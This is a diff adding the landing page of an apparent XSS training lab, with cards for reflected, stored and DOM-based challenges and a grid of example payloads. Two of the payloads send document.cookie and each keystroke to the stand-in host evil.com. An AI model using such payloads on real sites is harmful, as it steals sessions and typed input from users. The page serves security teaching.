@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Training Lab</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        }
+        
+        body {
+            background: var(--primary-gradient);
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 4rem 2rem;
+            color: white;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            margin: 2rem auto;
+            max-width: 1000px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .hero-subtitle {
+            font-size: 1.5rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+        }
+        
+        .warning-banner {
+            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
+            color: white;
+            padding: 2rem;
+            border-radius: 15px;
+            margin: 2rem auto;
+            max-width: 1000px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            border: 3px solid white;
+        }
+        
+        .warning-banner h2 {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+        }
+        
+        .modules-section {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin: 3rem auto;
+            max-width: 1200px;
+            padding: 0 2rem;
+        }
+        
+        .module-card {
+            background: white;
+            border-radius: 15px;
+            padding: 2rem;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            border: 3px solid transparent;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .module-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+        }
+        
+        .module-card.easy {
+            border-color: #2ecc71;
+        }
+        
+        .module-card.medium {
+            border-color: #f39c12;
+        }
+        
+        .module-card.hard {
+            border-color: #e74c3c;
+        }
+        
+        .module-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .module-title {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: #2c3e50;
+        }
+        
+        .module-description {
+            color: #7f8c8d;
+            margin-bottom: 1.5rem;
+            line-height: 1.6;
+        }
+        
+        .module-features {
+            margin-bottom: 2rem;
+        }
+        
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.5rem;
+            color: #34495e;
+        }
+        
+        .feature i {
+            color: #2ecc71;
+        }
+        
+        .difficulty-badge {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        
+        .difficulty-badge.easy {
+            background: #d1fae5;
+            color: #065f46;
+        }
+        
+        .difficulty-badge.medium {
+            background: #fef3c7;
+            color: #92400e;
+        }
+        
+        .difficulty-badge.hard {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+        
+        .btn-start {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            background: var(--primary-gradient);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1.1rem;
+        }
+        
+        .btn-start:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .quick-guide {
+            background: white;
+            border-radius: 15px;
+            padding: 3rem;
+            margin: 3rem auto;
+            max-width: 1000px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+        }
+        
+        .guide-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+        
+        .guide-step {
+            text-align: center;
+            padding: 1.5rem;
+            border-radius: 10px;
+            background: #f8fafc;
+            transition: all 0.3s ease;
+        }
+        
+        .guide-step:hover {
+            background: #e3f2fd;
+            transform: translateY(-5px);
+        }
+        
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background: var(--primary-gradient);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin: 0 auto 1rem;
+        }
+        
+        .payload-examples {
+            background: white;
+            border-radius: 15px;
+            padding: 3rem;
+            margin: 3rem auto;
+            max-width: 1000px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+        }
+        
+        .payload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+        
+        .payload-card {
+            background: #1a1a2e;
+            color: white;
+            border-radius: 10px;
+            padding: 1.5rem;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .payload-card code {
+            display: block;
+            background: #2c2c54;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            overflow-x: auto;
+            color: #ff6b6b;
+        }
+        
+        .payload-type {
+            color: #4ecdc4;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 2rem;
+            color: white;
+            margin-top: 3rem;
+        }
+        
+        .footer-warning {
+            background: rgba(255, 107, 107, 0.2);
+            padding: 1.5rem;
+            border-radius: 10px;
+            margin-bottom: 1rem;
+            border: 2px solid #ff6b6b;
+        }
+        
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .modules-section {
+                grid-template-columns: 1fr;
+                padding: 0 1rem;
+            }
+            
+            .guide-steps {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="hero">
+        <h1><i class="fas fa-shield-alt"></i> XSS Training Laboratory</h1>
+        <p class="hero-subtitle">Hands-on Cross-Site Scripting Vulnerability Training Environment</p>
+        <p>Learn, Test, and Master XSS attacks in a safe, controlled environment</p>
+    </div>
+
+    <div class="warning-banner">
+        <h2><i class="fas fa-exclamation-triangle"></i> IMPORTANT SECURITY NOTICE</h2>
+        <p>This application contains <strong>INTENTIONAL VULNERABILITIES</strong> for educational purposes only.</p>
+        <p><strong>DO NOT:</strong> Deploy in production • Use real personal data • Attack non-lab systems</p>
+        <p><strong>DO:</strong> Use in isolated environments • Reset after training • Learn prevention techniques</p>
+    </div>
+
+    <div class="modules-section">
+        <!-- Reflected XSS Module -->
+        <div class="module-card easy">
+            <div class="difficulty-badge easy">Easy</div>
+            <div class="module-icon">
+                <i class="fas fa-bolt"></i>
+            </div>
+            <h2 class="module-title">Reflected XSS</h2>
+            <p class="module-description">
+                User input is immediately reflected in the server response without proper encoding.
+                The malicious script is not stored but executed immediately.
+            </p>
+            <div class="module-features">
+                <div class="feature"><i class="fas fa-check-circle"></i> Immediate response reflection</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> URL parameter injection</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> Search/form field vulnerabilities</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> Error message reflection</div>
+            </div>
+            <a href="/reflected" class="btn-start">
+                <i class="fas fa-play-circle"></i> Start Challenge
+            </a>
+        </div>
+
+        <!-- Stored XSS Module -->
+        <div class="module-card medium">
+            <div class="difficulty-badge medium">Medium</div>
+            <div class="module-icon">
+                <i class="fas fa-database"></i>
+            </div>
+            <h2 class="module-title">Stored XSS</h2>
+            <p class="module-description">
+                User input is stored on the server and displayed to other users without sanitization.
+                This is the most dangerous type as it affects multiple users over time.
+            </p>
+            <div class="module-features">
+                <div class="feature"><i class="fas fa-check-circle"></i> Persistent storage in database</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> Multi-user impact</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> Comment system vulnerability</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> Cookie stealing scenarios</div>
+            </div>
+            <a href="/stored" class="btn-start">
+                <i class="fas fa-play-circle"></i> Start Challenge
+            </a>
+        </div>
+
+        <!-- DOM-Based XSS Module -->
+        <div class="module-card hard">
+            <div class="difficulty-badge hard">Hard</div>
+            <div class="module-icon">
+                <i class="fas fa-code"></i>
+            </div>
+            <h2 class="module-title">DOM-Based XSS</h2>
+            <p class="module-description">
+                Client-side JavaScript processes user input unsafely and writes it to the DOM.
+                The vulnerability exists entirely in client-side code.
+            </p>
+            <div class="module-features">
+                <div class="feature"><i class="fas fa-check-circle"></i> Client-side only vulnerabilities</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> Fragment identifier attacks</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> Unsafe JavaScript functions</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> Dynamic script injection</div>
+            </div>
+            <a href="/dom" class="btn-start">
+                <i class="fas fa-play-circle"></i> Start Challenge
+            </a>
+        </div>
+    </div>
+
+    <div class="quick-guide">
+        <h2 style="text-align: center; margin-bottom: 2rem; color: #2c3e50;">
+            <i class="fas fa-graduation-cap"></i> Quick Start Guide
+        </h2>
+        <div class="guide-steps">
+            <div class="guide-step">
+                <div class="step-number">1</div>
+                <h3>Choose Module</h3>
+                <p>Select Reflected, Stored, or DOM-Based XSS based on difficulty</p>
+            </div>
+            <div class="guide-step">
+                <div class="step-number">2</div>
+                <h3>Study Vulnerability</h3>
+                <p>Read the description, hints, and vulnerable code patterns</p>
+            </div>
+            <div class="guide-step">
+                <div class="step-number">3</div>
+                <h3>Craft Payload</h3>
+                <p>Use example payloads or create your own XSS attack</p>
+            </div>
+            <div class="guide-step">
+                <div class="step-number">4</div>
+                <h3>Test & Learn</h3>
+                <p>Execute payload and understand the vulnerability mechanism</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="payload-examples">
+        <h2 style="text-align: center; margin-bottom: 2rem; color: #2c3e50;">
+            <i class="fas fa-bug"></i> Example XSS Payloads
+        </h2>
+        <p style="text-align: center; margin-bottom: 2rem; color: #7f8c8d;">
+            Try these payloads in the appropriate modules
+        </p>
+        <div class="payload-grid">
+            <div class="payload-card">
+                <div class="payload-type">Basic Script</div>
+                <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                <p>Simple script tag injection</p>
+            </div>
+            <div class="payload-card">
+                <div class="payload-type">Image with onerror</div>
+                <code>&lt;img src=x onerror=alert(1)&gt;</code>
+                <p>Event handler based injection</p>
+            </div>
+            <div class="payload-card">
+                <div class="payload-type">JavaScript URI</div>
+                <code>javascript:alert(document.cookie)</code>
+                <p>JavaScript in URL protocol</p>
+            </div>
+            <div class="payload-card">
+                <div class="payload-type">SVG Payload</div>
+                <code>&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</code>
+                <p>SVG with event handler</p>
+            </div>
+            <div class="payload-card">
+                <div class="payload-type">Cookie Stealing</div>
+                <code>&lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</code>
+                <p>Steal user cookies</p>
+            </div>
+            <div class="payload-card">
+                <div class="payload-type">Key Logger</div>
+                <code>&lt;script&gt;document.onkeypress=function(e){fetch('http://evil.com?k='+e.key)}&lt;/script&gt;</code>
+                <p>Capture keyboard input</p>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-warning">
+            <h3><i class="fas fa-shield-alt"></i> Safety First!</h3>
+            <p>This lab is for educational purposes only. Always practice ethical hacking.</p>
+            <p>Report vulnerabilities responsibly and never test on systems without permission.</p>
+        </div>
+        <p>XSS Training Lab v1.0 | Educational Use Only | Built with ❤️ for Security Training</p>
+        <p style="margin-top: 1rem; opacity: 0.8;">
+            <a href="/admin" style="color: #4ecdc4; text-decoration: none;">
+                <i class="fas fa-cog"></i> Admin Panel
+            </a> |
+            <a href="https://owasp.org/www-community/attacks/xss/" target="_blank" style="color: #4ecdc4; text-decoration: none;">
+                <i class="fas fa-book"></i> OWASP XSS Guide
+            </a>
+        </p>
+    </footer>
+
+    <script>
+        // Add some interactivity
+        document.addEventListener('DOMContentLoaded', function() {
+            // Animate module cards on scroll
+            const observerOptions = {
+                threshold: 0.1,
+                rootMargin: '0px 0px -50px 0px'
+            };
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.style.opacity = '1';
+                        entry.target.style.transform = 'translateY(0)';
+                    }
+                });
+            }, observerOptions);
+            
+            // Set initial state for animation
+            document.querySelectorAll('.module-card, .guide-step, .payload-card').forEach(card => {
+                card.style.opacity = '0';
+                card.style.transform = 'translateY(20px)';
+                card.style.transition = 'all 0.5s ease';
+                observer.observe(card);
+            });
+            
+            // Add click animation to buttons
+            document.querySelectorAll('.btn-start').forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    // Create ripple effect
+                    const ripple = document.createElement('span');
+                    const rect = this.getBoundingClientRect();
+                    const size = Math.max(rect.width, rect.height);
+                    const x = e.clientX - rect.left - size / 2;
+                    const y = e.clientY - rect.top - size / 2;
+                    
+                    ripple.style.cssText = `
+                        position: absolute;
+                        border-radius: 50%;
+                        background: rgba(255, 255, 255, 0.7);
+                        transform: scale(0);
+                        animation: ripple 0.6s linear;
+                        width: ${size}px;
+                        height: ${size}px;
+                        top: ${y}px;
+                        left: ${x}px;
+                        pointer-events: none;
+                    `;
+                    
+                    this.appendChild(ripple);
+                    
+                    setTimeout(() => {
+                        ripple.remove();
+                    }, 600);
+                });
+            });
+            
+            // Add CSS for ripple animation
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes ripple {
+                    to {
+                        transform: scale(4);
+                        opacity: 0;
+                    }
+                }
+            `;
+            document.head.appendChild(style);
+        });
+    </script>
+</body>
+</html>
